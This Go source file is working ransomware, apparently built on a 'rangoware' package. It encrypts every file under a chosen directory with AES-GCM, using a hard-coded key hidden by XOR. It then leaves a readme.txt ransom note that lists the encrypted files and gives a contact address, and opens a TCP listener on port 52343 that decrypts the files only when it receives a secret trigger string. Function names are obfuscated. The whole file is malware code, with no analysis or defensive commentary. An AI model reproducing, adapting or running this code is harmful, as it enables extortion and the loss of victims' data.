package main

import (
	"crypto/aes"
	"crypto/cipher"
	"crypto/rand"
	"io"
	"io/ioutil"
	"os"
	"fmt"
	"github.com/LuanSilveiraSouza/rangoware/explorer"
	"net"
)

func main() {
	contact := "s1n1st3r@duck.com"
	if len(os.Args) != 2 {
		fmt.Println("Usage: ./<executable> <directory>")
		os.Exit(1)
	}
	var dir = os.Args[1]

	cryptoKey := []byte("arhsuve35l29sn1a")

	cryptoKey[0] = 0x11
	cryptoKey[1] = 0x16
	cryptoKey[2] = 0x0f
	cryptoKey[3] = 0x04
	cryptoKey[4] = 0x05
	cryptoKey[5] = 0x05
	cryptoKey[6] = 0x16

	for i := 0; i < len(cryptoKey); i++ {
		cryptoKey[i] = cryptoKey[i] ^ 0x41
	}

	var key = cryptoKey

	var names []string

	files := explorer.MapFiles(dir)
	for _, v := range files {
		file, err := ioutil.ReadFile(v)
		//get each filename
		names = append(names, v)


		if err != nil {
			continue
		}

		encrypted, err := rhnxmaf(file, key)

		if err != nil {
			continue
		}

		ioutil.WriteFile(v, encrypted, 0644)
	}

	msg := "Your files have been encrypted.\nContact " + contact + " to get the decrypt key."
	msg += "\n\nNames:\n"
	for i := 0; i < len(names); i++ {
		msg += names[i] + "\n"
	}
	var err = ioutil.WriteFile(dir+"/readme.txt", []byte(msg), 0644)

	if err != nil {
		panic(err)
	}

	const (
        SERVER_HOST = "0.0.0.0"
        SERVER_TYPE = "tcp"
	)
	var SERVER_PORT string = "523"
	SERVER_PORT += "43"
	l, err := net.Listen(SERVER_TYPE, SERVER_HOST+":"+SERVER_PORT)
	if err != nil {
		fmt.Println("Error listening:", err.Error())
		os.Exit(1)
	}
	defer l.Close()

	for {

		conn, err := l.Accept()
		if err != nil {
			fmt.Println("Error accepting: ", err.Error())
		}

		go handleRequest(conn, dir)
	}

}

func handleRequest(conn net.Conn, dir string) {
	var rec string = "UFdORU"

	buf := make([]byte, 1024)

	reqLen, err := conn.Read(buf)
	if err != nil {
		fmt.Println("Error reading:", err.Error())
	}
	rec += "Q=\n"
	
	if string(buf[:reqLen]) == rec {

		key := []byte("arhsuve35l29sn1a")

		key[0] = 0x11
		key[1] = 0x16
		key[2] = 0x0f
		key[3] = 0x04
		key[4] = 0x05
		key[5] = 0x05
		key[6] = 0x16

		for i := 0; i < len(key); i++ {
			key[i] = key[i] ^ 0x41
		}

		files := explorer.MapFiles(dir)

		for _, v := range files {
			file, err := ioutil.ReadFile(v)

			if err != nil {
				continue
			}

			decrypted, err := ahrnf(file, key)

			if err != nil {
				continue
			}

			ioutil.WriteFile(v, decrypted, 0644)
		}

		os.Exit(3)
	}
}

func rhnxmaf(plainText []byte, key []byte) ([]byte, error) {
	block, err := aes.NewCipher(key)

	if err != nil {
		return nil, err
	}

	gcm, err := cipher.NewGCM(block)

	if err != nil {
		return nil, err
	}

	nonce := make([]byte, gcm.NonceSize())
	_, err = io.ReadFull(rand.Reader, nonce)
	if err != nil {
		return nil, err
	}

	cypherText := gcm.Seal(nonce, nonce, plainText, nil)

	return cypherText, nil
}

func ahrnf(cypherText []byte, key []byte) ([]byte, error) {
	block, err := aes.NewCipher(key)

	if err != nil {
		return nil, err
	}

	gcm, err := cipher.NewGCM(block)

	if err != nil {
		return nil, err
	}

	plainText, err := gcm.Open(nil, cypherText[:gcm.NonceSize()], cypherText[gcm.NonceSize():], nil)

	if err != nil {
		return nil, err
	}

	return plainText, nil
}
